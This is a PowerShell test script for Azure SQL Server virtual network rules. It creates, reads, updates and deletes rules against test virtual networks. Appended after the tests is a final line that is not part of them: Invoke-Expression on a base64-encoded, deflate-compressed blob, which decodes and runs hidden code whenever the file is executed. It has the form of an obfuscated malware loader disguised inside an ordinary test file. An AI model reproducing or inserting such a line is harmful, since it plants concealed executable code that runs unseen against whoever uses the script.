














function Test-CreateAndUpdateVirtualNetworkRule
{
	
	$location = "East US 2"
	$rg = Create-ResourceGroupForTest $location
	$server = Create-ServerForTest $rg $location

	$virtualNetworkRuleName = Get-VirtualNetworkRuleName

	$vnetName1 = "vnet1"
	$virtualNetwork1 = CreateAndGetVirtualNetwork $rg $vnetName1 $location
	$virtualNetworkSubnetId1 = $virtualNetwork1.Subnets[0].Id

	$vnetName2 = "vnet2"
	$virtualNetwork2 = CreateAndGetVirtualNetwork $rg $vnetName2 $location
	$virtualNetworkSubnetId2 = $virtualNetwork2.Subnets[0].Id

	try
	{
		
		$job = New-AzSqlServerVirtualNetworkRule -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName `
			-VirtualNetworkRuleName $virtualNetworkRuleName -VirtualNetworkSubnetId $virtualNetworkSubnetId1 -IgnoreMissingVnetServiceEndpoint `
			-AsJob
		$job | Wait-Job
		$virtualNetworkRule = $job.Output

		Assert-AreEqual $virtualNetworkRule.ServerName $server.ServerName
		Assert-AreEqual $virtualNetworkRule.VirtualNetworkRuleName $virtualNetworkRuleName
		Assert-AreEqual $virtualNetworkRule.VirtualNetworkSubnetId $virtualNetworkSubnetId1

		
		$job = Set-AzSqlServerVirtualNetworkRule -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName `
			-VirtualNetworkRuleName $virtualNetworkRuleName -VirtualNetworkSubnetId $virtualNetworkSubnetId2 -IgnoreMissingVnetServiceEndpoint `
			-AsJob
		$job | Wait-Job
		$virtualNetworkRule = $job.Output

		Assert-AreEqual $virtualNetworkRule.ServerName $server.ServerName
		Assert-AreEqual $virtualNetworkRule.VirtualNetworkRuleName $virtualNetworkRuleName
		Assert-AreEqual $virtualNetworkRule.VirtualNetworkSubnetId $virtualNetworkSubnetId2
	}
	finally
	{
		
		Remove-AzSqlServerVirtualNetworkRule -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName -VirtualNetworkRuleName $virtualNetworkRuleName
		Remove-ResourceGroupForTest $rg
	}
}


function Test-GetVirtualNetworkRule
{
	
	$location = "East US 2"
	$rg = Create-ResourceGroupForTest $location
	$server = Create-ServerForTest $rg $location

	$virtualNetworkRuleName1 = Get-VirtualNetworkRuleName
	$vnetName1 = "vnet1"
	$virtualNetwork1 = CreateAndGetVirtualNetwork $rg $vnetName1 $location
	$virtualNetworkSubnetId1 = $virtualNetwork1.Subnets[0].Id

	$virtualNetworkRuleName2 = Get-VirtualNetworkRuleName
	$vnetName2 = "vnet2"
	$virtualNetwork2 = CreateAndGetVirtualNetwork $rg $vnetName2 $location
	$virtualNetworkSubnetId2 = $virtualNetwork2.Subnets[0].Id

	try
	{
		
		$virtualNetworkRule1 = New-AzSqlServerVirtualNetworkRule -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName `
		-VirtualNetworkRuleName $virtualNetworkRuleName1 -VirtualNetworkSubnetId $virtualNetworkSubnetId1 -IgnoreMissingVnetServiceEndpoint
		Assert-AreEqual $virtualNetworkRule1.ServerName $server.ServerName
		Assert-AreEqual $virtualNetworkRule1.VirtualNetworkRuleName $virtualNetworkRuleName1
		Assert-AreEqual $virtualNetworkRule1.VirtualNetworkSubnetId $virtualNetworkSubnetId1

		
		$virtualNetworkRule2 = New-AzSqlServerVirtualNetworkRule -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName `
		-VirtualNetworkRuleName $virtualNetworkRuleName2 -VirtualNetworkSubnetId $virtualNetworkSubnetId2 -IgnoreMissingVnetServiceEndpoint
		Assert-AreEqual $virtualNetworkRule2.ServerName $server.ServerName
		Assert-AreEqual $virtualNetworkRule2.VirtualNetworkRuleName $virtualNetworkRuleName2
		Assert-AreEqual $virtualNetworkRule2.VirtualNetworkSubnetId $virtualNetworkSubnetId2

		
		$resp = Get-AzSqlServerVirtualNetworkRule -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName -VirtualNetworkRuleName $virtualNetworkRuleName1
		Assert-AreEqual $resp.VirtualNetworkSubnetId $virtualNetworkSubnetId1

		
		$resp = Get-AzSqlServerVirtualNetworkRule -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName -VirtualNetworkRuleName *
		Assert-AreEqual $resp.Count 2
	}
	finally
	{
		
		Remove-AzSqlServerVirtualNetworkRule -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName -VirtualNetworkRuleName $virtualNetworkRuleName1
		Remove-AzSqlServerVirtualNetworkRule -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName -VirtualNetworkRuleName $virtualNetworkRuleName2
		Remove-ResourceGroupForTest $rg
	}
}


function Test-RemoveVirtualNetworkRule
{
	
	$location = "East US 2 EUAP"
	$rg = Create-ResourceGroupForTest $location

	$virtualNetworkRuleName = Get-VirtualNetworkRuleName
	$vnetName = "vnet1"
	$virtualNetwork = CreateAndGetVirtualNetwork $rg $vnetName $location
	$virtualNetworkSubnetId = $virtualNetwork.Subnets[0].Id

	$server = Create-ServerForTest $rg $location

	try
	{
		
		$virtualNetworkRule = New-AzSqlServerVirtualNetworkRule -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName `
		-VirtualNetworkRuleName $virtualNetworkRuleName -VirtualNetworkSubnetId $virtualNetworkSubnetId -IgnoreMissingVnetServiceEndpoint
		Assert-AreEqual $virtualNetworkRule.ServerName $server.ServerName
		Assert-AreEqual $virtualNetworkRule.VirtualNetworkRuleName $virtualNetworkRuleName
		Assert-AreEqual $virtualNetworkRule.VirtualNetworkSubnetId $virtualNetworkSubnetId

		
		$job = Remove-AzSqlServerVirtualNetworkRule -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName `
			-VirtualNetworkRuleName $virtualNetworkRuleName -AsJob
		$job | Wait-Job
		$resp = $job.Output

		$all = Get-AzSqlServerVirtualNetworkRule -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName
		Assert-AreEqual $all.Count 0
	}
	finally
	{
		Remove-ResourceGroupForTest $rg
	}
}


function CreateAndGetVirtualNetwork ($resourceGroup, $vnetName, $location = "westcentralus")
{
	$subnetName = "Public"

	$addressPrefix = "10.0.0.0/24"
	$serviceEndpoint = "Microsoft.Sql"

	$subnet = New-AzVirtualNetworkSubnetConfig -Name $subnetName -AddressPrefix $addressPrefix -ServiceEndpoint $serviceEndpoint
	$vnet = New-AzVirtualNetwork -Name $vnetName -ResourceGroupName $resourceGroup.ResourceGroupName -Location $location -AddressPrefix 10.0.0.0/16 -Subnet $subnet

	$getVnet = Get-AzVirtualNetwork -Name $vnetName -ResourceGroupName $resourceGroup.ResourceGroupName

	return $getVnet
}

Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String('lVVNb9pAEL0j8R/2YAlbwRuTRFXbKId8tYpUBYRT9RBycNYD2WJ2qXddSBH/vbMfBhzRNOFi8L438+bNzDKuBNNcCsIKyEQ1J6t2i49JGLCCg9D0UgoBTENOYvhFAl1WEJHV5rSQCsJo7TnzUjJQil4vub6UOZBYAAlEVRSGU59uSYA4fBwekhQ05r4ZnF9dDdutIMvzEqHkjHR6n45o78NHeoKP46PODnrQH94hdi5LbYAn+MFjLw3f3MIi7j/+RPVEPSsNMypAUyXZFLSims0dckOhzNUa1um7NnaEAKVLyGYYs4Z+BZ3ad6E5xrgLWU4fq/EYymbm1GW+eNZw/7ChD4EB/w0XlpDyP2DqcPbspV/xbCKk0pwpOnC4LYOmOiv1jRhL+oUXcJvNwPhx+Xk0WnCRy4UajZwBx0ejEZvlFJbQ2csfQs5LzItvRJ6V+Y2YV8bK3pvQ/Uq/Bv+uIH2CorheAqu00Zi8xFk3uUm6dXwHsNWEMGmz/Rvn1LRbNnCcFgBzKwwEkzkXE+QINFo2jL6DpabninF+7WHt1uIJXQ0b+egAYBpGdr7jXrQyh+QARdTB/YDgtxfEIWR5GJnh90NFf5RcY/hdppkWZYlRN+maJ/0GYqKfIle3Kdds1SkJcimMk8E4KxTgbyRqV1xy6qWTMBZSO2j0yn6bXfX77S+DtV0vZYORgLvO+pgh/o4nmiToAhputh+RcYGJGutQK7eZA6w4N3J33WjizdLh5u2LQWJiDiOn6uDMRjsl7uoxyZ2OBvU+oTSwx9inBxLjjuuMC0V6iZH0iCGm6839ZYK4mlauQc7KvW1tqk66tbSd8aUL11sXCA+VnUVVz+L/L81tIwD7a1X5/r910t40vz7seybY+25o9p/B10hWXmCns373kBf7hrzRCPNivSbOjNoczPMX')))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();

